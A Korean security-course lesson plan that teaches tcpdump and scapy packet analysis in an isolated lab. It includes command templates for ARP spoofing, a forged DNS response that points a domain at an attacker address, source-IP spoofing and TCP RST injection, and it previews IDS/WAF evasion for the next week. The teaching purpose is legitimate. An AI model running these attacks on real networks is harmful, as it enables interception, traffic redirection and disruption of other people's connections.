# Week 09 — 네트워크 공격 + 패킷 분석

> 본 주차는 L2-L4 네트워크 공격 — ARP / DNS / TCP/IP + scapy + tcpdump. 6v6 환경에서
> ARP spoofing / DNS poisoning / TCP RST injection 시뮬.

## 학습 목표

1. tcpdump + Wireshark 패킷 분석
2. scapy 의 packet 작성 + 송신
3. ARP spoofing (MITM)
4. DNS poisoning
5. TCP RST injection (conn 종료)
6. ATT&CK Lateral Movement

## 1. tcpdump

```
sudo tcpdump -i eth0 -n -nn                      # 기본
sudo tcpdump -i eth0 "tcp port 80"               # filter
sudo tcpdump -i eth0 -A "tcp port 80"            # ASCII 출력
sudo tcpdump -i eth0 -w capture.pcap             # pcap 파일
sudo tcpdump -i eth0 -X "host 10.20.30.202"      # hex+ASCII
```

BPF filter:
- `host <IP>` / `net <CIDR>`
- `port <N>` / `portrange N-M`
- `proto tcp / udp / icmp`
- `src <IP>` / `dst <IP>`

## 2. scapy

```
from scapy.all import *

# ping
send(IP(dst="10.20.30.1")/ICMP())

# SYN
send(IP(dst="10.20.30.1")/TCP(dport=80, flags="S"))

# spoof source
send(IP(src="1.2.3.4", dst="10.20.30.1")/TCP(dport=80))

# 패킷 캡처
sniff(filter="tcp port 80", count=10, prn=lambda x: x.show())
```

## 3. ARP spoofing

```
# attacker → 모든 호스트에 "10.20.30.1 의 MAC 은 attacker 의 MAC"
arpspoof -i eth0 -t <victim> -r <gateway>
```

MITM 위치 점령 → 트래픽 통제·변조.

## 4. DNS poisoning

```
# /etc/hosts 변조 (단순)
# 또는 DNS 응답 위조 (scapy)
send(IP(dst=<victim>)/UDP(dport=53)/DNS(qr=1, an=DNSRR(rrname="example.com", rdata="attacker_ip")))
```

## 5. TCP RST injection

```
send(IP(src=<spoofed>, dst=<victim>)/TCP(sport=<port>, dport=<port>, flags="R", seq=<seq>))
```

ssh / HTTP 세션을 강제 종료.

## 6. 실습 1~5

### 1 — tcpdump 캡처

```
ssh 6v6-attacker 'sudo timeout 5 tcpdump -ni eth0 -c 10 2>&1 | head'
```

### 2 — scapy ping + SYN

```
ssh 6v6-attacker 'sudo scapy -c "send(IP(dst=\"10.20.30.1\")/ICMP())" 2>&1 | head' || true
ssh 6v6-attacker 'sudo python3 -c "from scapy.all import *; r=sr1(IP(dst=\"10.20.30.1\")/TCP(dport=80, flags=\"S\"), timeout=2); r.show()" 2>&1 | head'
```

### 3 — Suricata 의 scan detection

```
ssh 6v6-ips 'sudo tail -50 /var/log/suricata/eve.json | grep alert | head'
```

### 4 — ARP table 조회

```
ssh 6v6-attacker 'ip neigh show'
ssh 6v6-attacker 'arp -a 2>&1 | head'
```

### 5 — TCP RST 시뮬 (실 lab 환경 영향 적게)

```
# scapy 의 RST 패킷 작성 + send (sniff 만, 실제 영향은 docker bridge 가 격리)
```

## 7. ATT&CK

| Tactic | Technique |
|--------|-----------|
| TA0008 Lateral Movement | T1021 Remote Services |
| TA0040 Impact | T1565 Data Manipulation |
| TA0011 C2 | T1090 Proxy |

## 8. 과제

A. tcpdump 캡처 (필수) — 1분 트래픽 분석
B. scapy 스크립트 (심화) — 10 packet 자동 생성
C. ARP / DNS 보안 분석 (정성)

## 9. W10 (IDS/WAF 우회) 예고

본 lab 의 Suricata / ModSec 의 paranoia / threshold 우회 패턴.
